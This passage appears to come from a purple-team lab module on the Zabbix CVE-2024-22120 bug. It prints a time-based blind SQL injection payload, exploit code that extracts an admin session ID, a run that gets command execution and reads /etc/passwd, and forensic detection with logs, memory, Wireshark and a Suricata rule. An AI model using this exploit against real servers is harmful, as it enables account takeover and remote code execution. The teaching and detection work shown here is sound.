(select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),%d,1)=\\"%c\\") THEN sleep(%d) ELSE sleep(%d) END)

```

The extraction occurs in the `ExtractAdminSessionId` function, which uses a `nested loop` structure. The outer loop iterates through each position of the target `sessionid` (from 1 to 32), while the inner loop tests potential characters ( `0-9`, `a-f`) for that position. A time-based blind SQL injection is performed by sending a crafted query that uses `CASE` to induce a delay ( `sleep(time_true)`) when the tested character is correct. The script calculates the time difference ( `diff`) between sending the query and receiving the response. If `diff` matches the expected delay ( `time_true`), the character is confirmed, appended to the `session_id`, and the loop proceeds to the next position. This process continues until all characters are extracted, returning the full admin `session_id`.

```python
<SNIP>
def ExtractAdminSessionId(ip, port, sid, hostid, time_false, time_true):
    session_id = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),%d,1)=\\"%c\\") THEN sleep(%d) ELSE sleep(%d) END)" % (i, c, time_true, time_false)
            SendMessage(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            diff = after_query-before_query
            print(f"(+) Finding session_id\\t sessionid={GREEN}{session_id}{RED}{c}{NC}", end='\\r')
            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                session_id += c
                #print("(+) session_id=%s" % session_id, flush=True)
                break
    print(f"(!) sessionid={session_id}")
    return session_id
<SNIP>

```

Once the `sessionid` value is obtained, the script utilizes Zabbix's [/api\_jsonrpc.php](https://www.zabbix.com/documentation/current/en/manual/api) API endpoint to create a new script using the privileged session, enabling command execution on the Zabbix server. The exploit generates a script with an ambiguous name, which will be visible on the dashboard to privileged users.

![Python script for CVE-2024-22120-RCE showing functions for creating, updating, and deleting scripts, with an RCE exploit function using JSON-RPC.](https://academy.hackthebox.com/storage/modules/257/rpc.png)

**Note**: Please note that the exploit script uses the [Zabbix sender protocol](https://www.zabbix.com/documentation/current/en/manual/appendix/protocols/zabbix_sender), a Zabbix-specific JSON-based communication protocol, to send its malicious requests. This will prove handy later during the "Post-Exploitation Forensic Analysis" part in this section.

##### Obtaining an Administrator's Session ID Through SQL Injection and Executing Commands

With all requirements met and the exploit's code analyzed, we can now execute the [CVE-2024-22120-RCE.py](https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py) Python3 exploit code to perform the time-based blind SQL injection and retrieve an administrator's session ID as follows.

**Note**: Due to the nature of the vulnerability, the script requires a few minutes to extract the admin `sessionid`, as it is an MD5 hash with a length of 32 characters. Once a valid session ID is retrieved, the script provides a prompt to execute commands on the Zabbix server.

```shell
python3 CVE-2024-22120-RCE.py --ip <Target_IP> --sid 35aca6b9ee39964caa943a08ec7ff929 --hostid 10084

(!) sessionid=ac4edf78485a0236afdc77e8f4011e30

[zabbix_cmd]>>:  id
uid=114(zabbix) gid=120(zabbix) groups=120(zabbix)

[zabbix_cmd]>>:  cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
zabbix:x:114:120::/var/lib/zabbix/:/usr/sbin/nologin
Debian-snmp:x:115:121::/var/lib/snmp:/bin/false
mysql:x:116:122:MySQL Server,,,:/nonexistent:/bin/false

[zabbix_cmd]>>:

```

#### Mitigation

To address the SQL injection vulnerability ( `CVE-2024-22120`), the Zabbix team has released patches in versions `6.0.28rc1`, `6.4.13rc1`, and `7.0.0beta2`. Users are strongly encouraged to upgrade to these versions to mitigate the associated risks and maintain the security of their monitoring infrastructure. Regular updates are crucial for safeguarding against potential threats. Alternatively, if updating is not immediately feasible, the vulnerability can be mitigated by disabling the audit log functionality.

* * *

## Post-Exploitation Forensic Analysis

Exploitation attempts of the `CVE-2024-22120` vulnerability can be detected by analyzing logs and network traffic for indicators of compromise, among other methods. This section provides guidance on utilizing Sysmon logs, Auditd logs, Zabbix logs, and captured network traffic within the Linux Purple Module target to conduct forensic analysis and identify evidence of exploitation related to `CVE-2024-22120`.

Ensure that the target has sufficient lifetime to conduct the forensic analysis effectively. If the target's lifetime is insufficient, extend it as necessary before proceeding.

Once the attack part has been completed and the target's lifetime has been confirmed or extended, connect to the Linux Purple Module target to perform the forensic analysis.

#### Sysmon Log Analysis

On Linux systems, monitoring Sysmon Event ID `1` (SYSMONEVENT\_CREATE\_PROCESS) can help identify unexpected processes initiated by Zabbix.

Sysmon logs on Linux are typically located at `/var/log/syslog`. To monitor for unexpected processes initiated by Zabbix, log into the Linux Purple module target (Zabbix host) via SSH and use the following command:

```shell
root@ubuntu:~# cat /var/log/syslog | /opt/sysmon/sysmonLogView -e 1 -f User=zabbix
<SNIP>
Event SYSMONEVENT_CREATE_PROCESS
	RuleName: -
	UtcTime: 2024-11-27 13:39:03.925
	ProcessGuid: {97985f39-20f7-6747-95a9-d92b35560000}
	ProcessId: 2981
	Image: /usr/bin/dash
	FileVersion: -
	Description: -
	Product: -
	Company: -
	OriginalFileName: -
	CommandLine: sh -c id
	CurrentDirectory: /
	User: zabbix
	LogonGuid: {97985f39-0000-0000-7200-000000000000}
	LogonId: 114
	TerminalSessionId: 4294967295
	IntegrityLevel: no level
	Hashes: SHA256=4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
	ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
	ParentProcessId: 1557
	ParentImage: -
	ParentCommandLine: -
	ParentUser: -
Event SYSMONEVENT_CREATE_PROCESS
	RuleName: -
	UtcTime: 2024-11-27 13:39:03.926
	ProcessGuid: {97985f39-20f7-6747-a1f8-8ab8c2550000}
	ProcessId: 2982
	Image: /usr/bin/id
	FileVersion: -
	Description: -
	Product: -
	Company: -
	OriginalFileName: -
	CommandLine: id
	CurrentDirectory: /
	User: zabbix
	LogonGuid: {97985f39-0000-0000-7200-000000000000}
	LogonId: 114
	TerminalSessionId: 4294967295
	IntegrityLevel: no level
	Hashes: SHA256=301882faeaa476b0ce2d2bbc4e6217e494d4d768efa6d38464bf5ca366f40104
	ParentProcessGuid: {97985f39-20f7-6747-95a9-d92b35560000}
	ParentProcessId: 2981
	ParentImage: /usr/bin/dash
	ParentCommandLine: sh
	ParentUser: zabbix
Event SYSMONEVENT_CREATE_PROCESS
	RuleName: -
	UtcTime: 2024-11-27 13:39:52.807
	ProcessGuid: {97985f39-2128-6747-95b9-c020ab550000}
	ProcessId: 2986
	Image: /usr/bin/dash
	FileVersion: -
	Description: -
	Product: -
	Company: -
	OriginalFileName: -
	CommandLine: sh -c cat /etc/passwd
	CurrentDirectory: /
	User: zabbix
	LogonGuid: {97985f39-0000-0000-7200-000000000000}
	LogonId: 114
	TerminalSessionId: 4294967295
	IntegrityLevel: no level
	Hashes: SHA256=4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
	ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
	ParentProcessId: 1566
	ParentImage: -
	ParentCommandLine: -
	ParentUser: -
Event SYSMONEVENT_CREATE_PROCESS
	RuleName: -
	UtcTime: 2024-11-27 13:39:52.808
	ProcessGuid: {97985f39-2128-6747-81fb-657c56550000}
	ProcessId: 2987
	Image: /usr/bin/cat
	FileVersion: -
	Description: -
	Product: -
	Company: -
	OriginalFileName: -
	CommandLine: cat /etc/passwd
	CurrentDirectory: /
	User: zabbix
	LogonGuid: {97985f39-0000-0000-7200-000000000000}
	LogonId: 114
	TerminalSessionId: 4294967295
	IntegrityLevel: no level
	Hashes: SHA256=210ffa7daedb3ef6e9230d391e9a10043699ba81080ebf40c6de70ed77e278ba
	ParentProcessGuid: {97985f39-2128-6747-95b9-c020ab550000}
	ParentProcessId: 2986
	ParentImage: /usr/bin/dash
	ParentCommandLine: sh
	ParentUser: zabbix

<SNIP>

```

The logs clearly reveal the execution of the `id` and `cat /etc/passwd` commands, which were run through the exploit script earlier under the context of the Zabbix user.

#### Auditd Log Analysis

In all Linux Purple module targets, Auditd rules are located in `/etc/audit/audit.rules` (taken from [here](https://github.com/Neo23x0/auditd/blob/master/audit.rules)). Several Auditd rules are tagged with `recon` to capture and log the execution of binaries associated with reconnaissance activities. To monitor for unexpected processes initiated by Zabbix related to reconnaissance activities, it is crucial to first determine Zabbix's `UID`, as Auditd logs do not directly include the username. This can be achieved by logging into the Linux Purple module target (Zabbix host) via SSH and executing one of the following commands:

```shell
root@ubuntu:~# id -u zabbix
114

```

```shell
root@ubuntu:~# getent passwd zabbix
zabbix:x:114:120::/var/lib/zabbix/:/usr/sbin/nologin

```

Once Zabbix's `UID` is identified, log entries tagged with `recon` can be filtered using `ausearch` to isolate relevant events associated with the Zabbix UID:

```shell
root@ubuntu:~# ausearch -ua 114 -m EXECVE | grep "recon"
type=SYSCALL msg=audit(1732714743.915:26526): arch=c000003e syscall=59 success=yes exit=0 a0=56352bda2730 a1=56352bda26d8 a2=56352bda26e8 a3=8 items=2 ppid=2981 pid=2982 auid=4294967295 uid=114 gid=120 euid=114 suid=114 fsuid=114 egid=120 sgid=120 fsgid=120 tty=(none) ses=4294967295 comm="id" exe="/usr/bin/id" subj=unconfined key="recon"

```

The log clearly reveals the execution of the `id` command, which was run through the exploit script earlier under the context of the Zabbix user.

#### Zabbix Log Analysis

Zabbix server logs (located at `/var/log/zabbix/zabbix_server.log`) can also be reviewed for any suspicious activity. For instance, suspicious SQL queries may be identified within the log file.

```shell
root@ubuntu:~# cat /var/log/zabbix/zabbix_server.log
<SNIP>
 1564:20241127:131943.590 slow query: 10.004646 sec, "insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwx9zl00017gjxq6wv591o',3,'htb-student',1732713573,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),1,1)="0") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwx9zl00017gjxq6wv591o','{"script.execute_on":["add","2"],"script.hostid":["add","10084"],"script.command":["add","/usr/bin/traceroute 127.0.0.1"],"script.error":["add","sh: 1: /usr/bin/traceroute: not found\\n"]}')"
  1567:20241127:131944.581 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1562:20241127:132009.612 slow query: 10.005261 sec, "insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwxu2f00047ejx7aro21lq',3,'htb-student',1732713599,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),2,1)="b") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwxu2f00047ejx7aro21lq','{"script.execute_on":["add","2"],"script.hostid":["add","10084"],"script.command":["add","/usr/bin/traceroute 127.0.0.1"],"script.error":["add","sh: 1: /usr/bin/traceroute: not found\\n"]}')"
  1557:20241127:132010.568 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1564:20241127:132011.721 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1564:20241127:132021.724 slow query: 10.003532 sec, "insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwy3ex00047gjx7aro21lq',3,'htb-student',1732713611,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),3,1)="1") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwy3ex00047gjx7aro21lq','{"script.execute_on":["add","2"],"script.hostid":["add","10084"],"script.command":["add","/usr/bin/traceroute 127.0.0.1"],"script.error":["add","sh: 1: /usr/bin/traceroute: not found\\n"]}')"
  1567:20241127:132021.872 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1566:20241127:132023.184 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1557:20241127:132044.920 slow query: 10.005640 sec, "insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwylb7000779jxd6q8rxar',3,'htb-student',1732713634,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),4,1)="a") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwylb7000779jxd6q8rxar','{"script.execute_on":["add","2"],"script.hostid":["add","10084"],"script.command":["add","/usr/bin/traceroute 127.0.0.1"],"script.error":["add","sh: 1: /usr/bin/traceroute: not found\\n"]}')"
  1557:20241127:132045.068 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1567:20241127:132107.770 slow query: 10.002921 sec, "insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwz2xz00067jjxuj4cgm3s',3,'htb-student',1732713657,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),5,1)="b") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwz2xz00067jjxuj4cgm3s','{"script.execute_on":["add","2"],"script.hostid":["add","10084"],"script.command":["add","/usr/bin/traceroute 127.0.0.1"],"script.error":["add","sh: 1: /usr/bin/traceroute: not found\\n"]}')"
  1566:20241127:132107.918 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found

  1564:20241127:132127.141 slow query: 10.004186 sec, "insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwzhw100087gjxlazn0irw',3,'htb-student',1732713677,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),6,1)="8") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwzhw100087gjxlazn0irw','{"script.execute_on":["add","2"],"script.hostid":["add","10084"],"script.command":["add","/usr/bin/traceroute 127.0.0.1"],"script.error":["add","sh: 1: /usr/bin/traceroute: not found\\n"]}')"
  1557:20241127:132127.290 Failed to execute command "/usr/bin/traceroute 127.0.0.1": sh: 1: /usr/bin/traceroute: not found
<SNIP>

```

The log clearly reveals the execution of SQL queries matching the format used by the exploit script referenced earlier.

#### Memory Analysis

Capturing memory with `LiME` can be performed as follows once the attack part has concluded.

```shell
cd /root/LiME/src/
sudo insmod lime-5.15.0-71-generic.ko "path=/tmp/dump.mem format=lime"

```

The memory dump will be saved in the following location:
`/tmp/dump.mem`

Using the following command, we can identify traces of `(select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),%d,1)=\\"%c\\") THEN sleep(%d) ELSE sleep(%d) END)` (taken from the aforementioned exploit sciprt) within the dumped memory.

```shell
root@ubuntu:/tmp# strings dump.mem | grep -E "\(select CASE WHEN \(substr\(\(select sessionid from sessions where userid=1 limit 1\),[0-9]+,1\)=\\\\\".\\\\\") THEN sleep\([0-9]+\) ELSE sleep\([0-9]+\) END\)"
{"request": "command", "sid": "f9fea16d67bdf584640d1598f49a5dd7", "scriptid": "2", "clientip": "1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),31,1)=\"0\") THEN sleep(10) ELSE sleep(1) END)+ '1", "hostid": "10084"}
{"request": "command", "sid": "f9fea16d67bdf584640d1598f49a5dd7", "scriptid": "2", "clientip": "1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),28,1)=\"3\") THEN sleep(10) ELSE sleep(1) END)+ '1", "hostid": "10084"}
{"request": "command", "sid": "f9fea16d67bdf584640d1598f49a5dd7", "scriptid": "2", "clientip": "1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),28,1)=\"1\") THEN sleep(10) ELSE sleep(1) END)+ '1", "hostid": "10084"}
<SNIP>

```

#### Traffic Analysis

To analyze network traffic related to the attack, we can leverage the automatic traffic capturing that is configured to occur on all Linux Purple module targets at boot. The traffic capture files can be accessed as follows:

1. Once the attack part is complete, connect to the Linux Purple module target (Zabbix host) via SSH.
2. Stop the `tcpdump` service to halt packet capturing and safely access the `.pcap` files by using the command:

```shell
root@ubuntu:~# sudo systemctl stop tcpdump.service

```

1. Access the `.pcap` files in the `/tmp` directory, which are named based on the timestamp of when the capture started, allowing easy identification of the relevant file.
2. From inside Pwnbox, download the `.pcap` files securely using SCP with the command:

```shell
scp root@<Target_IP>:/root/htb/tcp_dump_2024-11-19-08:39:47.pcap .
root@Target_IP's password:
tcp_dump_2024-11-19-08:39:47.pcap
100% 6205KB   1.6MB/s   00:03

```

##### Inspecting TCP Traffic in Wireshark

The downloaded `.pcap` file can be analyzed in Wireshark as follows:

```shell
wireshark tcp_dump_2024-11-19-08\:39\:47.pcap
** (wireshark:241328) 03:08:35.841875 [GUI WARNING] -- QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac-871408'
 ** (wireshark:241328) 03:08:35.875771 [GUI WARNING] -- QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac-871408'

```

![Terminal showing SCP command to transfer a pcap file and Wireshark opening tcp_dump_2024-11-19-08:39:47.pcap with network traffic details.](https://academy.hackthebox.com/storage/modules/257/forpurple1.png)

As mentioned earlier, the exploit script uses the Zabbix sender protocol to send its malicious requests. Therefore, any malicious artifacts of the attack within the traffic capture can be identified in TCP traffic rather than plain HTTP.

TCP traffic can be isolated using the following filter:

```wireshark
tcp

```

![Wireshark displaying TCP packet details between IPs 10.10.14.80 and 10.129.231.23, highlighting frame 88 with payload data.](https://academy.hackthebox.com/storage/modules/257/forpurple2.png)

By examining the packets, we notice SQL queries that match the format used by the exploit script mentioned earlier.

We can right-click on the suspicious packet containing an SQL query matching the exploit script's format and choose `Follow` \> `TCP Stream` from the context menu. This will display the entire SQL query in the request, making it more visible and easier to analyze.

![Wireshark showing TCP stream between 10.10.14.80 and 10.129.231.23, highlighting frame 88 with payload data and a command response indicating traceroute not found.](https://academy.hackthebox.com/storage/modules/257/forpurple3.png)

##### Inspecting TCP Traffic With Suricata

Instead of manually going through packets in `Wireshark`, we could also utilize the following `Suricata` rule to search for attack artifacts in the traffic.

```shell
alert tcp any any -> $HOME_NET any (msg:"ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120)"; content:"ZBXD|01|"; fast_pattern; startswith; content:"|22|clientip|22 3a|"; pcre:"/^[^\x2c]*(?:(?:S(?:HOW\x20(?:C(?:UR(?:DAT|TIM)E|HARACTER\x20SET)|(?:VARI|T)ABLES)|ELECT\x20(?:FROM|USER))|U(?:NION\x20SELEC|PDATE\x20SE)T|DELETE\x20FROM|INSERT\x20INTO)|S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|\x2f\*.+\*\x2f)?/Ri"; reference:url,support.zabbix.com/browse/ZBX-24505; reference:cve,2024-22120; classtype:web-application-attack; sid:2055989; rev:1; metadata:affected_product Zabbix, attack_target Server, tls_state plaintext, created_at 2024_09_19, cve CVE_2024_22120, deployment Perimeter, deployment Internal, performance_impact Moderate, confidence High, signature_severity Major, tag Exploit, updated_at 2024_09_19, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1190, mitre_technique_name Exploit_Public_Facing_Application; target:dest_ip;)

```

Here’s how we can do it:

1. Connect to the Linux Purple Module target (Zabbix host) via SSH after the attack part has concluded.
2. Create a file named `suricata.rules` in the `/root` directory and insert the aforementioned Suricata rule inside it.
3. Execute `Suricata` as follows from inside the `/tmp` directory to identify if the captured traffic contains `CVE-2024-22120` exploitation artifacts.

```shell
root@ubuntu:/tmp# suricata -r /tmp/tcp_dump_2024-11-28-11\:19\:10.pcap -s /root/suricata.rules
i: suricata: This is Suricata version 7.0.5 RELEASE running in USER mode
W: detect: No rule files match the pattern /var/lib/suricata/rules/suricata.rules
i: threads: Threads created -> RX: 1 W: 2 FM: 1 FR: 1   Engine started.
i: suricata: Signal Received.  Stopping engine.
i: pcap: read 1 file, 29787 packets, 7542384 bytes
root@ubuntu:/tmp# cat fast.log
11/28/2024-11:22:52.942430  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:39492 -> 10.129.231.23:10051
11/28/2024-11:23:05.386433  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37726 -> 10.129.231.23:10051
11/28/2024-11:23:09.980631  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37770 -> 10.129.231.23:10051
11/28/2024-11:23:11.126284  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37772 -> 10.129.231.23:10051
11/28/2024-11:23:14.570416  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:50864 -> 10.129.231.23:10051
11/28/2024-11:23:15.718785  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:50868 -> 10.129.231.23:10051
11/28/2024-11:23:03.092362  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37704 -> 10.129.231.23:10051
11/28/2024-11:23:25.864055  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:35964 -> 10.129.231.23:10051
11/28/2024-11:23:04.238361  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37716 -> 10.129.231.23:10051
11/28/2024-11:23:06.534337  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37732 -> 10.129.231.23:10051
11/28/2024-11:23:38.302902  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:47614 -> 10.129.231.23:10051
11/28/2024-11:23:07.685975  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37744 -> 10.129.231.23:10051
11/28/2024-11:23:08.832344  [**] [1:2055989:1] ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.10.14.95:37756 -> 10.129.231.23:10051
<SNIP>

```

The rule was triggered multiple times, as the `.pcap` file contains traffic that matches the pattern the Suricata rule is designed to detect, specifically related to the blind SQL injection vulnerability in Zabbix.

* * *

This is just the tip of the iceberg in terms of the possible detection avenues one can pursue by leveraging the built-in logging capabilities and the DFIR toolset of Linux Purple Module targets. Feel free to experiment and identify your own investigation avenues.


# Transferring Files to and from Purple Module Targets

This section explains the process of transferring files between a workstation and the Purple Module targets, enabling the execution of the use cases described in the module's "Introduction" section.

It is assumed that `Pwnbox` is being used as the workstation. Pwnbox is pre-configured to operate on the same VPN network as the Purple Module targets, enabling seamless communication without additional setup.

For workstations other than Pwnbox, connecting to the Hack The Box Academy VPN is necessary to establish communication with the Purple Module targets. Refer to the relevant guide for the appropriate platform:

- [HTB Academy VPN Connection Guide](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) – for users accessing HTB Academy
- [HTB Enterprise VPN Connection Guide](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) – for users accessing HTB Enterprise

## File Transfers on Windows Purple Module Targets

When interacting with Windows Purple Module targets, several tools and techniques can facilitate file transfers between Pwnbox and the targets, such as SSH, RDP, and others. Since all Windows Purple Module targets have an SSH server pre-installed, the `scp` (Secure Copy) utility is a practical and reliable method for transferring files.

#### Using SCP (Secure Copy)

`SCP` is a widely used command-line tool for secure file transfer over SSH. It allows copying files or directories between local and remote systems, maintaining simplicity and security.

##### Transferring Files from Pwnbox to a Windows Purple Module Target

To copy files from Pwnbox to a Windows Purple Module target, the following `scp` command can be used:

```shell
scp /path/to/local/file username@<Target_IP>:/path/to/remote/destination

```

An example of the command execution can be seen below:

```shell
scp /home/htb-ac-871408/data/file1.txt [email protected]:C:/Users/Administrator/Desktop

The authenticity of host '10.129.232.10 (10.129.232.10)' can't be established.
ED25519 key fingerprint is SHA256:9avrzlcxgO/6dQndFnNFSqthwXMuBkaJCPOkWt3vkes.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.10' (ED25519) to the list of known hosts.
[email protected]'s password:
file1.txt                                                                                                                     100%   13     0.1KB/s   00:00

```

The file `file1.txt` is successfully transferred to the `Desktop` directory of the `Administrator` user on the Windows Purple Module target.

##### Transferring Files from a Windows Purple Module Target to Pwnbox

To copy files from a Windows Purple Module target back to Pwnbox, the following `scp` command can be used:

```shell
scp username@<Target_IP>:/path/to/remote/file /path/to/local/destination

```

An example of the command execution can be seen below:

```shell
scp [email protected]:C:/Users/Administrator/Desktop/file2.txt /home/htb-ac-871408/data/
[email protected]'s password:
file2.txt                                                                                                                     100%   13     0.0KB/s   00:00

```

In this example, the file `file2.txt` is successfully transferred from the `Desktop` directory of the `Administrator` user on the Windows Purple Module target to the `/home/htb-ac-871408/data/` directory on Pwnbox.

* * *

## File Transfers on Linux Purple Module Targets

File transfers on Linux Purple Module targets can be efficiently achieved using tools such as `scp`, `rsync`, and `sftp`. These tools facilitate secure file exchange between Pwnbox and the Linux target systems.

#### Using SCP (Secure Copy)

##### Transfer Files from Pwnbox to a Linux Purple Module Target

To transfer a file from Pwnbox to a Linux Purple Module target, the following `scp` command can be used:

```shell
scp /path/to/local/file username@<Target_IP>:/path/to/remote/destination

```

An example of the command execution can be seen below:

```shell
scp /home/htb-ac-871408/data/file.txt [email protected]:/root/data
[email protected]'s password:
Permission denied, please try again.
[email protected]'s password:
file.txt                                      100%   13     0.1KB/s   00:00

```

This command transfers the `file.txt` file from the local directory `/home/htb-ac-871408/data` on Pwnbox to the remote directory `/root/data` on the Linux Purple Module target.

##### Transferring Files from a Linux Purple Module Target to Pwnbox

To copy files from a Linux Purple Module target to Pwnbox, the following `scp` command can be used:

```shell
scp username@<Target_IP>:/path/to/remote/file /path/to/local/destination

```

An example of the command execution can be seen below:

```shell
scp [email protected]:/tmp/tcp_dump_2024-11-22-07:04:48.pcap /home/htb-ac-871408/data
[email protected]'s password:
